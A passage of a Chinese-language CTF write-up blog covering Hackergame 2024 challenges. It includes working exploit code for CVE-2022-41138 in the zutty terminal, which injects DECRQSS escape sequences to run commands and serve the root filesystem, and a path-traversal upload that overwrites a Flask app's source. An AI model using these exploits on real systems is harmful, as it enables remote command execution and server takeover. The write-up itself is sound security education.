    <span class="token keyword">match</span> stream<span class="token punctuation">.</span><span class="token function">read</span><span class="token punctuation">(</span><span class="token operator">&amp;</span><span class="token keyword">mut</span> buffer<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token class-name">Ok</span><span class="token punctuation">(</span>_<span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>
            <span class="token keyword">let</span> request <span class="token operator">=</span> <span class="token class-name">String</span><span class="token punctuation">::</span><span class="token function">from_utf8_lossy</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>buffer<span class="token punctuation">[</span><span class="token punctuation">..</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

            <span class="token macro property">println!</span><span class="token punctuation">(</span><span class="token string">"Received request: &#123;&#125;"</span><span class="token punctuation">,</span> request<span class="token punctuation">.</span><span class="token function">lines</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">next</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">unwrap_or</span><span class="token punctuation">(</span><span class="token string">""</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">...</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>看到这里就够了！后面的代码就是很常规的处理HTTP请求。</p>
<p>为什么会注意到这个<code>println!</code>函数呢？这还得感谢出题人在题目中的暗示：<strong>几年前编译的某<del>祖传</del>终端模拟器</strong>。</p>
<p>我在注意到这条暗示之前，尝试了很多其他的方法，例如想通过同时发起一大堆HTTP请求把服务器搞崩之类的，不过统统不奏效。后面才看到了这个暗示，于是我看了一下附件给的其他文件，比如下面这个<code>Dockerfile</code>：</p>
<pre class="line-numbers language-docker" data-language="docker"><code class="language-docker"><span class="token comment"># Uncomment "RUN echo"s, then do this locally for testing:</span>
<span class="token comment"># docker build -t local/anime .</span>
<span class="token comment"># cat &lt;YOUR_PAYLOAD> | base64 --wrap=0 | docker run --rm --tmpfs /dev/shm:exec --tmpfs /tmp -i local/anime</span>
<span class="token instruction"><span class="token keyword">FROM</span> ustclug/debian:bullseye <span class="token keyword">AS</span> builder</span>

<span class="token instruction"><span class="token keyword">RUN</span> apt update &amp;&amp; apt install -y git build-essential python3-dev pkg-config libfreetype-dev libxmu-dev libgles2-mesa-dev &amp;&amp; <span class="token operator">\</span>
    git clone https://git.hq.sig7.se/zutty.git &amp;&amp; cd zutty &amp;&amp; git checkout 0.12 &amp;&amp; <span class="token operator">\</span>
    ./waf configure &amp;&amp; ./waf</span>

<span class="token instruction"><span class="token keyword">FROM</span> ustclug/debian:bullseye</span>
<span class="token instruction"><span class="token keyword">RUN</span> apt update &amp;&amp; apt install -y python3 xvfb libfreetype6 libxmu6 libgles2-mesa libegl1 netcat-openbsd curl</span>
<span class="token instruction"><span class="token keyword">COPY</span> <span class="token options"><span class="token property">--from</span><span class="token punctuation">=</span><span class="token string">builder</span></span> /zutty/build/src/zutty /usr/local/bin/zutty</span>
<span class="token comment"># Start it once to create shader cache</span>
<span class="token instruction"><span class="token keyword">RUN</span> timeout -s 9 5 xvfb-run /usr/local/bin/zutty || true</span>
<span class="token instruction"><span class="token keyword">COPY</span> src/fileserver /usr/local/bin/fileserver</span>

<span class="token comment"># Start fileserver automatically in zutty :)</span>
<span class="token instruction"><span class="token keyword">RUN</span> echo <span class="token string">"cd /root/chroot/ &amp;&amp; chroot /root/chroot/ fileserver"</span> > /root/.bashrc &amp;&amp; <span class="token operator">\</span>
    mkdir /root/chroot &amp;&amp; cp -r /lib* /root/chroot/ &amp;&amp; mkdir -p /root/chroot/usr/ /root/chroot/usr/bin/ /root/chroot/usr/local/bin/ &amp;&amp; <span class="token operator">\</span>
    cp -r /usr/lib* /root/chroot/usr/ &amp;&amp; cp -r /usr/bin/* /root/chroot/usr/bin/ &amp;&amp; cp -r /usr/local/bin/* /root/chroot/usr/local/bin/</span>
<span class="token instruction"><span class="token keyword">COPY</span> src/ /src/</span>

<span class="token comment"># Note that you cannot just "cat /flag1" directly on server :)</span>
<span class="token comment"># RUN echo "Submit your program to get real flag1 on server!" > /flag1 &amp;&amp; \</span>
<span class="token comment">#     echo "Submit your program to get real flag2 on server!" > /flag2</span>

<span class="token instruction"><span class="token keyword">CMD</span> [<span class="token string">"python3"</span>, <span class="token string">"-u"</span>, <span class="token string">"/src/server.py"</span>]</span>
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>注意到题目里说的终端模拟器是指<code>zutty</code>，版本为<code>0.12</code>，立刻去查相关的CVE，查到了<a target="_blank" rel="noopener" href="https://nvd.nist.gov/vuln/detail/CVE-2022-41138">这个链接</a>。</p>
<blockquote>
<p>In Zutty before 0.13, DECRQSS in text written to the terminal can achieve arbitrary code execution.</p>
</blockquote>
<p>是说如果我们能任意控制打印到<code>zutty</code>终端上的内容的话，就可以通过一个叫<code>DECRQSS</code>的东西执行任意命令。而这东西是个啥呢？查了一下发现还挺复杂，不过好在刚刚那个网页给了一个有用的<a target="_blank" rel="noopener" href="https://bugs.gentoo.org/868495">链接</a>，这个链接则给了一个利用此CVE的payload，以及<code>zutty</code>修复这个CVE的patch：</p>
<p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://blogfiles.oss.fyz666.xyz/png/bb300cf1-25f4-44a3-add7-ae52849bcba8.png" alt="image-20241109191608825" style="zoom:50%"></p>
<p>这个<code>poc.txt</code>的内容如下：</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">with</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">'poc.txt'</span><span class="token punctuation">,</span> <span class="token string">'rb'</span><span class="token punctuation">)</span> <span class="token keyword">as</span> f<span class="token punctuation">:</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span>f<span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
    
<span class="token string">b'\x1bP$q\ncat /etc/passwd\n\x1b\\\n'</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
<p>也就是说我们可以试图去构造类似于这种样子的payload，让服务端打印出这样的东西，就能执行一些命令了。</p>
<p>搞懂了这些以后，就知道我们需要注意服务端源代码的这一行：</p>
<pre class="line-numbers language-rust" data-language="rust"><code class="language-rust"><span class="token macro property">println!</span><span class="token punctuation">(</span><span class="token string">"Received request: &#123;&#125;"</span><span class="token punctuation">,</span> request<span class="token punctuation">.</span><span class="token function">lines</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">next</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">unwrap_or</span><span class="token punctuation">(</span><span class="token string">""</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p>它会把我们发起的请求的第一行打到屏幕上，注意是<strong>第一行</strong>，这也意味着，如果按前面的payload那样在中间插入一些换行符<code>\n</code>，就达不到同样的效果，好在我们还可以用<code>\r</code>代替<code>\n</code>，所以我们可以把payload改成：</p>
<pre class="line-numbers language-raw" data-language="raw"><code class="language-raw">b&#39;\x1bP$q\r???\r\x1b\\\n&#39;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p>不过<code>???</code>处要填什么东西可以让服务退出呢？我一开始一直在想有什么让服务退出的命令，结果发过去发现一个都不能运行起来。后来才意识到，文件服务阻塞了终端，你命令能运行就怪了。</p>
<p>然后我想到平时我们自己在终端上让服务停下来，好像一般都是按<kbd>Ctrl</kbd> + <kbd>C</kbd>。查了一下发现这个组合键其实是向终端发送了一个<code>\x03</code>。</p>
<p>于是：</p>
<pre class="line-numbers language-raw" data-language="raw"><code class="language-raw">b&#39;\x1bP$q\r\x03\r\x1b\\\n&#39;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p>这样就可以拿到flag1了。</p>
<p>最终的解题代码：</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment">#!/usr/bin/env python3</span>

<span class="token keyword">import</span> socket

payload <span class="token operator">=</span> <span class="token string">b'\x1bP$q\r\x03\r\x1b\\'</span>

<span class="token keyword">with</span> socket<span class="token punctuation">.</span>socket<span class="token punctuation">(</span>socket<span class="token punctuation">.</span>AF_INET<span class="token punctuation">,</span> socket<span class="token punctuation">.</span>SOCK_STREAM<span class="token punctuation">)</span> <span class="token keyword">as</span> s<span class="token punctuation">:</span>
    s<span class="token punctuation">.</span>connect<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token string">'127.0.0.1'</span><span class="token punctuation">,</span> <span class="token number">8000</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
    s<span class="token punctuation">.</span>sendall<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<h3 id="希望的终端模拟器，连接着我们的羁绊"><a href="#希望的终端模拟器，连接着我们的羁绊" class="headerlink" title="希望的终端模拟器，连接着我们的羁绊"></a>希望的终端模拟器，连接着我们的羁绊</h3><p>这一问，我们需要拿到位于服务器根目录的flag2。</p>
<p>很自然想法是，我们现在相当于可以在终端上执行任意命令了，只是看不到终端的输出内容。</p>
<pre class="line-numbers language-raw" data-language="raw"><code class="language-raw">b&#39;\x1bP$q\r\x03\r???\r\x1b\\\n&#39;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p>在<code>???</code>处插入任意的命令，应该都可以执行，并且不存在<code>chroot</code>限制。</p>
<p>一开始的想法是，我通过一个操作把<code>/flag2</code>搬到当前目录，然后重新把<code>fileserver</code>启动起来，再向<code>flieserver</code>发起一个<code>GET /flag2</code>，就行了。结果试了好久才发现这个当前目录居然是只读的。于是这道题卡了小半天。</p>
<p>到了晚上突然想起，我为什么非得用他提供的文件服务呢？我不是还有<code>Python</code>？</p>
<p>于是写出下面payload：</p>
<pre class="line-numbers language-raw" data-language="raw"><code class="language-raw">b&#39;\x1bP$q\r\x03\rpython3 -m http.server 8080 --directory &#x2F;\r\x1b\\&#39;,<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p>这样就可以把他的服务干掉以后开一个<code>Python</code>的文件服务器，而且可以指定根目录为当前目录。</p>
<p>最终的脚本如下：</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment">#!/usr/bin/env python3</span>

<span class="token keyword">import</span> socket
<span class="token keyword">import</span> time
<span class="token keyword">import</span> re

payloads <span class="token operator">=</span> <span class="token punctuation">[</span>
    <span class="token string">b'\x1bP$q\r\x03\rpython3 -m http.server 8080 --directory /\r\x1b\\'</span><span class="token punctuation">,</span>
    <span class="token string">b'GET /flag2\r\n\r\n'</span>
<span class="token punctuation">]</span>


<span class="token keyword">def</span> <span class="token function">request</span><span class="token punctuation">(</span>port<span class="token punctuation">,</span> payload<span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">with</span> socket<span class="token punctuation">.</span>socket<span class="token punctuation">(</span>socket<span class="token punctuation">.</span>AF_INET<span class="token punctuation">,</span> socket<span class="token punctuation">.</span>SOCK_STREAM<span class="token punctuation">)</span> <span class="token keyword">as</span> s<span class="token punctuation">:</span>
        s<span class="token punctuation">.</span>connect<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token string">'127.0.0.1'</span><span class="token punctuation">,</span> port<span class="token punctuation">)</span><span class="token punctuation">)</span>
        s<span class="token punctuation">.</span>sendall<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>
        response <span class="token operator">=</span> <span class="token string">b""</span>
        <span class="token keyword">while</span> <span class="token number">1</span><span class="token punctuation">:</span>
            data <span class="token operator">=</span> s<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">4096</span><span class="token punctuation">)</span>
            <span class="token keyword">if</span> <span class="token keyword">not</span> data<span class="token punctuation">:</span>
                <span class="token keyword">break</span>
            response <span class="token operator">+=</span> data
        <span class="token keyword">return</span> response<span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token punctuation">)</span>


request<span class="token punctuation">(</span><span class="token number">8000</span><span class="token punctuation">,</span> payloads<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
time<span class="token punctuation">.</span>sleep<span class="token punctuation">(</span><span class="token number">0.5</span><span class="token punctuation">)</span>
flag2 <span class="token operator">=</span> request<span class="token punctuation">(</span><span class="token number">8080</span><span class="token punctuation">,</span> payloads<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
<span class="token keyword">print</span><span class="token punctuation">(</span>re<span class="token punctuation">.</span>search<span class="token punctuation">(</span><span class="token string">r'flag\&#123;.*&#125;'</span><span class="token punctuation">,</span> flag2<span class="token punctuation">)</span><span class="token punctuation">.</span>group<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>使用此脚本可以一次拿俩flag。</p>
<h2 id="关灯"><a href="#关灯" class="headerlink" title="关灯"></a>关灯</h2><details class="toggle"><summary class="toggle-button">查看题面</summary><div class="toggle-content"><div class="note primary simple"><p>3D 版本的关灯游戏。</p>
<p>注：解决这道题不需要很多计算资源，一般的笔记本电脑都是可以完成任务的。最后一问传输数据量较大而且时限很短，为了避免网速的影响，使用了多阶段的题目下载与答案上传机制。</p>
<p><a target="_blank" rel="noopener" href="https://github.com/USTC-Hackergame/hackergame2024-writeups/blob/master/official/%E5%85%B3%E7%81%AF/files/lights_out.py">题目源代码</a></p>
</div>
</div></details>
<h3 id="Easy-amp-Medium-amp-Hard"><a href="#Easy-amp-Medium-amp-Hard" class="headerlink" title="Easy &amp; Medium &amp; Hard"></a>Easy &amp; Medium &amp; Hard</h3><p>前三问送分，直接用<code>z3</code>：</p>
<p><a target="_blank" rel="noopener" href="https://gist.github.com/windshadow233/55180c5e648be86f5ffcb950968e6f24">解题代码</a></p>
<p>第四问复杂度炸了，估计得用什么方法优化，没怎么研究。</p>
<h2 id="禁止内卷"><a href="#禁止内卷" class="headerlink" title="禁止内卷"></a>禁止内卷</h2><details class="toggle"><summary class="toggle-button">查看题面</summary><div class="toggle-content"><div class="note primary simple"><p>（以下剧情均为虚构，请助教和学生都不要模仿！）</p>
<p>XXX 课程实验一内容：</p>
<blockquote>
<p>本实验需要使用给定的用户评论预测用户对书籍、电影和动画的评分。</p>
<p>…………（部分省略）</p>
<p>我们提供来自诸如某瓣、某某艺、某字母站、某某米等网站的一部分用户评论和评分数据作为训练集，你需要使用这些数据训练模型，来预测对于另一部分给定的评论（测试集），用户会打出怎样的给分。测试集只提供评论数据，不提供评分。用户评分均归一化到 0 到 100 分的整数。</p>
<p>对于我们给定的 50000 项的测试集，本实验要求提交对这些测试集你的模型的输出结果，以 JSON 列表的格式输出，列表中每一项是一个 0 到 100 的整数。</p>
<p>特别地，为了鼓励同学们互相 PK，我们特别开设了评分网站，提供<strong>前 500 项</strong>的数据测试。诸位可以在做实验的时候提交自己的结果，直接看到自己距离预期分数的平方差，更有榜单功能。</p>
<p>实验 DDL：…………（部分省略）</p>
</blockquote>
<p>但是这周的实验和作业实在是太多了，太多了，太多了。而且和你同班的有至少 114 个卷王。你刷新着榜单网站，看到榜一越来越小的平方差，陷入了绝望。</p>
<p>不过你的舍友好像之前说他帮这门课助教写了个啥东西（没有加分），好像就是这个网站。你私聊问他要到了源代码，白盒审计的时候发现了不得了的事情……你发现，你不仅可以拿到答案，而且可以搞点破坏，让各位卷王不要再卷了！</p>
<p>本题的 flag 位于评分数据<strong>原始 JSON 文件</strong>的列表头部，将对应的数字加 65 后使用 ASCII 编码转换后即为 flag 文本。</p>
<p><a target="_blank" rel="noopener" href="https://github.com/USTC-Hackergame/hackergame2024-writeups/raw/refs/heads/master/official/%E7%A6%81%E6%AD%A2%E5%86%85%E5%8D%B7/src/web/app.py">题目源代码</a></p>
<p>提示：助教部署的时候偷懒了，直接用了 <code>flask run</code>（当然了，助教也读过 Flask 的文档，所以 DEBUG 是关了的）。而且有的时候助教想改改代码，又懒得手动重启，所以还开了 <code>--reload</code>。启动的完整命令为 <code>flask run --reload --host 0</code>。网站代码运行在 <code>/tmp/web</code>。</p>
</div>
</div></details>
<p>不知道为啥这题一开始做的人那么少，害得我一直没去看。后来看了一眼，发现极其送分，从开始看源代码到拿到flag，应该不超过10分钟。</p>
<p>源代码如下：</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> flask <span class="token keyword">import</span> Flask<span class="token punctuation">,</span> render_template<span class="token punctuation">,</span> request<span class="token punctuation">,</span> flash<span class="token punctuation">,</span> redirect<span class="token punctuation">,</span> jsonify
<span class="token keyword">import</span> json
<span class="token keyword">import</span> os
<span class="token keyword">import</span> traceback
<span class="token keyword">import</span> secrets

app <span class="token operator">=</span> Flask<span class="token punctuation">(</span>__name__<span class="token punctuation">)</span>
app<span class="token punctuation">.</span>secret_key <span class="token operator">=</span> secrets<span class="token punctuation">.</span>token_urlsafe<span class="token punctuation">(</span><span class="token number">64</span><span class="token punctuation">)</span>

UPLOAD_DIR <span class="token operator">=</span> <span class="token string">"/tmp/uploads"</span>

os<span class="token punctuation">.</span>makedirs<span class="token punctuation">(</span>UPLOAD_DIR<span class="token punctuation">,</span> exist_ok<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">)</span>

<span class="token comment"># results is a list</span>
<span class="token keyword">try</span><span class="token punctuation">:</span>
    <span class="token keyword">with</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">"results.json"</span><span class="token punctuation">)</span> <span class="token keyword">as</span> f<span class="token punctuation">:</span>
        results <span class="token operator">=</span> json<span class="token punctuation">.</span>load<span class="token punctuation">(</span>f<span class="token punctuation">)</span>
<span class="token keyword">except</span> FileNotFoundError<span class="token punctuation">:</span>
    results <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>
    <span class="token keyword">with</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">"results.json"</span><span class="token punctuation">,</span> <span class="token string">"w"</span><span class="token punctuation">)</span> <span class="token keyword">as</span> f<span class="token punctuation">:</span>
        json<span class="token punctuation">.</span>dump<span class="token punctuation">(</span>results<span class="token punctuation">,</span> f<span class="token punctuation">)</span>


<span class="token keyword">def</span> <span class="token function">get_answer</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token comment"># scoring with answer</span>
    <span class="token comment"># I could change answers anytime so let's just load it every time</span>
    <span class="token keyword">with</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">"answers.json"</span><span class="token punctuation">)</span> <span class="token keyword">as</span> f<span class="token punctuation">:</span>
        answers <span class="token operator">=</span> json<span class="token punctuation">.</span>load<span class="token punctuation">(</span>f<span class="token punctuation">)</span>
        <span class="token comment"># sanitize answer</span>
        <span class="token keyword">for</span> idx<span class="token punctuation">,</span> i <span class="token keyword">in</span> <span class="token builtin">enumerate</span><span class="token punctuation">(</span>answers<span class="token punctuation">)</span><span class="token punctuation">:</span>
            <span class="token keyword">if</span> i <span class="token operator">&lt;</span> <span class="token number">0</span><span class="token punctuation">:</span>
                answers<span class="token punctuation">[</span>idx<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">0</span>
    <span class="token keyword">return</span> answers


<span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">"/"</span><span class="token punctuation">,</span> methods<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">"GET"</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
<span class="token keyword">def</span> <span class="token function">index</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">return</span> render_template<span class="token punctuation">(</span><span class="token string">"index.html"</span><span class="token punctuation">,</span> results<span class="token operator">=</span><span class="token builtin">sorted</span><span class="token punctuation">(</span>results<span class="token punctuation">)</span><span class="token punctuation">)</span>


<span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">"/submit"</span><span class="token punctuation">,</span> methods<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">"POST"</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
<span class="token keyword">def</span> <span class="token function">submit</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">if</span> <span class="token string">"file"</span> <span class="token keyword">not</span> <span class="token keyword">in</span> request<span class="token punctuation">.</span>files <span class="token keyword">or</span> request<span class="token punctuation">.</span>files<span class="token punctuation">[</span><span class="token string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">.</span>filename <span class="token operator">==</span> <span class="token string">""</span><span class="token punctuation">:</span>
        flash<span class="token punctuation">(</span><span class="token string">"你忘了上传文件"</span><span class="token punctuation">)</span>
        <span class="token keyword">return</span> redirect<span class="token punctuation">(</span><span class="token string">"/"</span><span class="token punctuation">)</span>
    <span class="token builtin">file</span> <span class="token operator">=</span> request<span class="token punctuation">.</span>files<span class="token punctuation">[</span><span class="token string">'file'</span><span class="token punctuation">]</span>
    filename <span class="token operator">=</span> <span class="token builtin">file</span><span class="token punctuation">.</span>filename
    filepath <span class="token operator">=</span> os<span class="token punctuation">.</span>path<span class="token punctuation">.</span>join<span class="token punctuation">(</span>UPLOAD_DIR<span class="token punctuation">,</span> filename<span class="token punctuation">)</span>
    <span class="token builtin">file</span><span class="token punctuation">.</span>save<span class="token punctuation">(</span>filepath<span class="token punctuation">)</span>

    answers <span class="token operator">=</span> get_answer<span class="token punctuation">(</span><span class="token punctuation">)</span>
    <span class="token keyword">try</span><span class="token punctuation">:</span>
        <span class="token keyword">with</span> <span class="token builtin">open</span><span class="token punctuation">(</span>filepath<span class="token punctuation">)</span> <span class="token keyword">as</span> f<span class="token punctuation">:</span>
            user <span class="token operator">=</span> json<span class="token punctuation">.</span>load<span class="token punctuation">(</span>f<span class="token punctuation">)</span>
    <span class="token keyword">except</span> json<span class="token punctuation">.</span>decoder<span class="token punctuation">.</span>JSONDecodeError<span class="token punctuation">:</span>
        flash<span class="token punctuation">(</span><span class="token string">"你提交的好像不是 JSON"</span><span class="token punctuation">)</span>
        <span class="token keyword">return</span> redirect<span class="token punctuation">(</span><span class="token string">"/"</span><span class="token punctuation">)</span>
    <span class="token keyword">try</span><span class="token punctuation">:</span>
        score <span class="token operator">=</span> <span class="token number">0</span>
        <span class="token keyword">for</span> idx<span class="token punctuation">,</span> i <span class="token keyword">in</span> <span class="token builtin">enumerate</span><span class="token punctuation">(</span>answers<span class="token punctuation">)</span><span class="token punctuation">:</span>
            score <span class="token operator">+=</span> <span class="token punctuation">(</span>i <span class="token operator">-</span> user<span class="token punctuation">[</span>idx<span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">*</span> <span class="token punctuation">(</span>i <span class="token operator">-</span> user<span class="token punctuation">[</span>idx<span class="token punctuation">]</span><span class="token punctuation">)</span>
    <span class="token keyword">except</span><span class="token punctuation">:</span>
        flash<span class="token punctuation">(</span><span class="token string">"分数计算出现错误"</span><span class="token punctuation">)</span>
        traceback<span class="token punctuation">.</span>print_exc<span class="token punctuation">(</span><span class="token punctuation">)</span>
        <span class="token keyword">return</span> redirect<span class="token punctuation">(</span><span class="token string">"/"</span><span class="token punctuation">)</span>
    <span class="token comment"># ok, update results</span>
    results<span class="token punctuation">.</span>append<span class="token punctuation">(</span>score<span class="token punctuation">)</span>
    <span class="token keyword">with</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">"results.json"</span><span class="token punctuation">,</span> <span class="token string">"w"</span><span class="token punctuation">)</span> <span class="token keyword">as</span> f<span class="token punctuation">:</span>
        json<span class="token punctuation">.</span>dump<span class="token punctuation">(</span>results<span class="token punctuation">,</span> f<span class="token punctuation">)</span>
    flash<span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"评测成功，你的平方差为 </span><span class="token interpolation"><span class="token punctuation">&#123;</span>score<span class="token punctuation">&#125;</span></span><span class="token string">"</span></span><span class="token punctuation">)</span>
    <span class="token keyword">return</span> redirect<span class="token punctuation">(</span><span class="token string">"/"</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>花里胡哨的算分功能，根本不用看，只要意识到在<code>/submit</code>接口有一个路径穿越漏洞就行了，因为它是用<code>os.path.join</code>来拼接路径的，所以我们就可以上传一个文件名类似于<code>../../balabala</code>这种，我们就基本可以想上传到哪就上传到哪。</p>
<p>注意到题目告诉了我们：网站代码运行在 <code>/tmp/web</code>，而且他甚至还开了<code>--reload</code>。既然网站是用<code>flask</code>写的，那我盲猜一波主文件在<code>/tmp/web/app.py</code>，而我们上传的路径在<code>/tmp/uploads</code>，所以我们直接上传一个文件<code>../web/app.py</code>，这个操作则可以用<code>requests</code>实现：</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> requests

url <span class="token operator">=</span> <span class="token string">'https://chal02-drfrs8jw.hack-challenge.lug.ustc.edu.cn:8443/'</span>
<span class="token builtin">file</span> <span class="token operator">=</span> <span class="token string">'backend.py'</span>

<span class="token keyword">with</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token builtin">file</span><span class="token punctuation">,</span> <span class="token string">'rb'</span><span class="token punctuation">)</span> <span class="token keyword">as</span> f<span class="token punctuation">:</span>
    files <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token string">'file'</span><span class="token punctuation">:</span> <span class="token punctuation">(</span><span class="token string">'../web/app.py'</span><span class="token punctuation">,</span> f<span class="token punctuation">)</span><span class="token punctuation">&#125;</span>
    response <span class="token operator">=</span> requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url <span class="token operator">+</span> <span class="token string">'submit'</span><span class="token punctuation">,</span> files<span class="token operator">=</span>files<span class="token punctuation">)</span>
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>而<code>backend.py</code>文件中，我们就可以去写拿flag的逻辑了，比如把index路径的请求改了：</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">"/"</span><span class="token punctuation">,</span> methods<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">"GET"</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
<span class="token keyword">def</span> <span class="token function">index</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">with</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">"answers.json"</span><span class="token punctuation">)</span> <span class="token keyword">as</span> f<span class="token punctuation">:</span>
        answers <span class="token operator">=</span> json<span class="token punctuation">.</span>load<span class="token punctuation">(</span>f<span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token number">100</span><span class="token punctuation">]</span>
    ascii_answers <span class="token operator">=</span> <span class="token string">''</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span><span class="token builtin">chr</span><span class="token punctuation">(</span>num <span class="token operator">+</span> <span class="token number">65</span><span class="token punctuation">)</span> <span class="token keyword">for</span> num <span class="token keyword">in</span> answers <span class="token keyword">if</span> <span class="token builtin">isinstance</span><span class="token punctuation">(</span>num<span class="token punctuation">,</span> <span class="token builtin">int</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
    <span class="token keyword">return</span> ascii_answers
    <span class="token comment"># return render_template("index.html", results=sorted(results))</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>这样访问网站根路径就可以直接拿到flag。</p>
<h2 id="哈希三碰撞"><a href="#哈希三碰撞" class="headerlink" title="哈希三碰撞"></a>哈希三碰撞</h2><details class="toggle"><summary class="toggle-button">查看题面</summary><div class="toggle-content"><div class="note primary simple"><blockquote>
<p>以下内容包含 AI 辅助创作</p>
</blockquote>
<p>「太奇怪了！」小 Z 盯着显示器愁眉不展。</p>
